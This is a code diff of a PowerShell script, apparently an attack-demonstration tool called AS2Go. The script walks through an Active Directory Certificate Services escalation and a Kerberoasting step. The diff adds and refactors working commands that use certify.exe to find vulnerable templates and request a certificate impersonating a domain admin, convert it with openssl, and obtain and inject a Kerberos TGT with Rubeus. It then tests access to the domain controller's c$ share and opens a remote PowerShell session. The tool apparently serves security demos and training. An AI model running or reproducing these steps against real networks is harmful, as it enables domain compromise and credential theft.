@@ -164,7 +164,60 @@ return $true
 
 #region AS2Go0 Functions
 
+function Get-KerberosTGT {
 
+################################################################################
+#####                                                                      ##### 
+#####             Get-KerberosTGT                  #####
+#####                                                                      #####
+################################################################################
+
+
+Param([string] $pfxFile, [string] $altname)
+
+$myfunction = Get-FunctionName
+Write-Log -Message "### Start Function $myfunction ###"
+#region ################## main code | out- host #####################
+
+#$password = Read-Host "Enter password for pfx file - $pfxFile"
+$request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt"
+
+Write-Host "`nNext Step:"
+Write-Host $request -ForegroundColor $global:FGCCommand
+Write-Log -Message $request
+
+pause
+
+Write-Host "Before"
+dir $env:LOGONSERVER\c$
+pause
+
+#Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt} | Out-Host
+Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile} | Out-Host
+
+pause
+dir $env:LOGONSERVER\c$
+
+pause
+
+Try
+{
+Enter-PSSession -ComputerName $env:USERDNSDOMAIN -ErrorAction Stop
+}
+Catch
+{
+    $message = $_
+    Write-Host " "$message.CategoryInfo.Reason:" " -NoNewline
+    $message.Exception
+}
+pause
+
+Write-Log -Message "    >> using $PfxFile"
+#endregion ####################### main code #########################
+Write-Log -Message "### End Function $myfunction ###"
+
+return $true
+}
 
 function Start-ConvertingToPfxFromPem {
 
@@ -184,7 +237,8 @@ Write-Log -Message "### Start Function $myfunction ###"
 $PfxFile = $pemFile.tolower().Replace("pem","pfx")
 
 Write-Host "`nNext Step:"
-$convert = "openssl pkcs12 -in .\$pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out .\$pfxFile" 
+$convert = "openssl pkcs12 -in .\$pemFile -keyex -CSP ""Microsoft Enhanced Cryptographic Provider v1.0"" -export -out .\$pfxFile"
+Write-Log -Message  $convert
 Write-Host $convert -ForegroundColor $global:FGCCommand
 pause
 
@@ -214,7 +268,6 @@ Write-Log -Message "### End Function $myfunction ###"
 return $PfxFile
 }
 
-
 function Start-RequestingCertificate {
 
 ################################################################################
@@ -236,6 +289,7 @@ $pemFile = "$altname.pem".ToLower()
 
 Write-Host "  NEXT STEP: " -NoNewline
 Write-Host ".\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname`n" -ForegroundColor $global:FGCCommand
+Write-Log -Message "     >> .\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname"
 pause
 
 
@@ -258,7 +312,8 @@ $result = certutil -config $myEntCA -ping
 
 #Request a Certificates
 If ($result[2].ToLower().Contains("successfully") -eq $True) {
-   Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname} | out-host
+   Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname} | Out-host
+   #Invoke-Command -ScriptBlock {.\certify.exe request /ca:$myEntCA /template:$CAtemplate /altname:$altname} | Out-File .\$pemFile
    Invoke-Command -ScriptBlock {notepad .\$pemFile}
    Write-Log -Message "The certificate retrieved is in a PEM format - $pemFile" 
    }
@@ -289,6 +344,7 @@ Write-Log -Message "### Start Function $myfunction ###"
 $CAtemplate = "AS2Go"
 Write-Host "  NEXT STEP: " -NoNewline
 Write-Host ".\certify.exe find /vulnerable`n" -ForegroundColor $global:FGCCommand
+Write-log -Message "     .\certify.exe find /vulnerable"
 pause
 
 #find vulnerable CA templates
@@ -333,7 +389,7 @@ Write-Host "  NEXT STEP: " -NoNewline
 Write-Host "certutil`n" -ForegroundColor $global:FGCCommand
 
 #get the Enterprise CA name
-Invoke-Command -ScriptBlock {certutil}
+Invoke-Command -ScriptBlock {certutil} | Out-Host
 Write-Host ""
 
 $MyCAConfig = Invoke-Command -ScriptBlock {certutil}
@@ -341,14 +397,16 @@ $temp       = $MyCAConfig[7].Split([char]0x0060).Split([char]0x0027).Split([char
 $myEntCA    = $temp[1]
 
 $question = "`n -> Enter or confirm the Enterprise Certification Authority! Default "
-$myEntCA = Get-Answer -question $question -defaultValue $myEntCA
+$answer = Get-Answer -question $question -defaultValue $myEntCA
 
-Write-Log -Message "Using - $myEntCA"
+Set-KeyValue -key "EnterpriseCA" -NewValue $answer
+
+Write-Log -Message "    >> Using - $answer"
 
 #endregion ####################### main code #########################
 Write-Log -Message "### End Function $myfunction ###"
 
-return $myEntCA
+return $answer
 }
 
 function Start-KerberoastingAttack {
@@ -374,6 +432,8 @@ $hashes   = "$myDomain.hashes.txt"
 #write-host "AS2Go uses Rubeus.exe to request a service ticket for any service with a registered SPN`n"
 Write-Host "NEXT STEP: " -NoNewline
 Write-Host ".\$RUBEUS kerberoast /domain:$myDomain /outfile:.\$hashes" -ForegroundColor $global:FGCCommand
+Write-Log -Message "     >> .\$RUBEUS kerberoast /domain:$myDomain /outfile:.\$hashes"
+ 
 
 $question = "`nDo you want to run this step - Y or N? Default "
 $answer   = Get-Answer -question $question -defaultValue $No
@@ -2598,8 +2658,8 @@ If ($DeveloperMode)
 # function to test 
 #Restart-VictimMachines
 Write-host "START Run directy" -ForegroundColor Red
-$mydebug = Start-ConvertingToPfxFromPem -pemFile "da-20221102.pem"
-write-host $mydebug
+
+#write-host $mydebug
 
 #Invoke-Command -ScriptBlock {.\certify.exe find /vulnerable}
 Write-host "END Run directy" -ForegroundColor Red
@@ -2902,7 +2962,9 @@ Write-Host "      Step 1 - Get the Enterprise Certification Authority"
 Write-Host "____________________________________________________________________`n"    
 #region Step 1 - Get the Enterprise Certification Authority   
 
-$EntCA = Get-EnterpriseCAName
+$EnterpriseCA = Get-EnterpriseCAName
+
+
 Clear-Host
 
 Write-Host "____________________________________________________________________`n" 
@@ -2923,7 +2985,7 @@ Write-Host "      Step 2 - Finding an Vulnerable Certificate Templates "
 Write-Host "____________________________________________________________________`n"
 
 #region Step 2 - Finding an Vulnerable Certificate Templates
-#today
+
 
 $CAtemplate = Get-VulnerableCertificateTemplate
 
@@ -2938,8 +3000,8 @@ Write-Host "____________________________________________________________________
 
 #region Step 3 - Requesting Certificate with Certify
 
-$pemFile = Start-RequestingCertificate -myEntCA $EntCA -CAtemplate $CAtemplate -altname $domainadmin
-# End "Do ... Until" Loop?
+$pemFile = Start-RequestingCertificate -myEntCA $EnterpriseCA -CAtemplate $CAtemplate -altname $domainadmin
+
 $question = "`nDo you need to REPEAT this attack level - Y or N? Default "
 $repeat   = Get-Answer -question $question -defaultValue $no
    
@@ -2953,52 +3015,32 @@ Write-Host "____________________________________________________________________
 Write-Host "      Step 4 - Converting to PFX from PEM via OpenSSL                   "
 Write-Host "____________________________________________________________________`n"
 
-
+$pfxFile = Start-ConvertingToPfxFromPem -pemFile $pemFile
    
 } Until ($repeat -eq $no)
 
 
 #endregion Step 4 - Converting PEM to PFX via openSSL
 #region Step 5 - Request a Kerberos TGT
-pause
 
+Do 
+{
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "      Step 5 - Request a Kerberos TGT "
 Write-Host "               for the user for which we minted the new certificate                  "
 Write-Host "____________________________________________________________________`n"
-
-$password = Read-Host "Password from pfx file - $pfxFile"
-$request = "Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt"
-
-Write-Host "`nNext Step:"
-Write-Host $request -ForegroundColor $global:FGCCommand
-
-pause
-
-Write-Host "Before"
-dir $env:LOGONSERVER\c$
+#today
 
 
-Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt}
 
-pause
-dir $env:LOGONSERVER\c$
+$mydebug = Get-KerberosTGT -pfxFile .\$pfxFile -altname $domainadmin
 
-pause
 
-Try
-{
-Enter-PSSession -ComputerName $env:USERDNSDOMAIN -ErrorAction Stop
-}
-Catch
-{
-    $message = $_
-    Write-Host " "$message.CategoryInfo.Reason:" " -NoNewline
-    $message.Exception
-}
-pause
-
+$question = "`nDo you need to REPEAT this attack level - Y or N? Default "
+$repeat   = Get-Answer -question $question -defaultValue $no
+   
+} Until ($repeat -eq $no)
 #endregion Step 5 - Request a Kerberos TGT
 
 
